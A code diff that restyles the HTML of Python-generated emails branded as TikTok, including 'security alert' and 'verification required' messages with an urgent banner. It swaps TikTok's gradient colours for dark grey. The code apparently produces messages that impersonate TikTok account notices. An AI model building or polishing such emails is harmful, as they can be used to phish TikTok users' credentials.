@@ -91,7 +91,7 @@ def send_custom_tiktok_email(smtp_server, smtp_port, sender_email, sender_passwo
             </head>
             <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
                 <div class="email-container" style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
-                    <div class="header" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); padding: 30px 20px; text-align: center;">
+                    <div class="header" style="background-color: #1a1a1a; padding: 30px 20px; text-align: center;">
                         <div class="tiktok-logo" style="margin-bottom: 20px;">
                             {logo_html}
                         </div>
@@ -155,7 +155,7 @@ def send_custom_tiktok_email(smtp_server, smtp_port, sender_email, sender_passwo
             </head>
             <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
                 <div class="email-container" style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
-                    <div class="header" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); padding: 30px 20px; text-align: center;">
+                    <div class="header" style="background-color: #1a1a1a; padding: 30px 20px; text-align: center;">
                         <div class="tiktok-logo" style="margin-bottom: 20px;">
                             {logo_html}
                         </div>
@@ -223,7 +223,7 @@ def send_custom_tiktok_email(smtp_server, smtp_port, sender_email, sender_passwo
             </head>
             <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
                 <div class="email-container" style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
-                    <div class="header" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); padding: 30px 20px; text-align: center;">
+                    <div class="header" style="background-color: #1a1a1a; padding: 30px 20px; text-align: center;">
                         <div class="tiktok-logo" style="margin-bottom: 20px;">
                             {logo_html}
                         </div>
@@ -332,7 +332,7 @@ def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_
         }}
         
         .header {{
-            background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%);
+            background-color: #1a1a1a;
             padding: 30px 20px;
             text-align: center;
         }}
@@ -654,7 +654,7 @@ def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
         }}
         
         .header {{
-            background: linear-gradient(135deg, #ff0050 0%, #00f2ea 100%);
+            background-color: #1a1a1a;
             padding: 30px 20px;
             text-align: center;
         }}
@@ -678,7 +678,7 @@ def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
         }}
         
         .urgent-banner {{
-            background: linear-gradient(135deg, #ff0050 0%, #ff6b35 100%);
+            background-color: #2d2d2d;
             color: #ffffff;
             padding: 20px;
             border-radius: 8px;
@@ -686,6 +686,7 @@ def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
             margin-bottom: 30px;
             font-weight: 600;
             font-size: 18px;
+            border: 2px solid #ff0050;
         }}
         
         .greeting {{
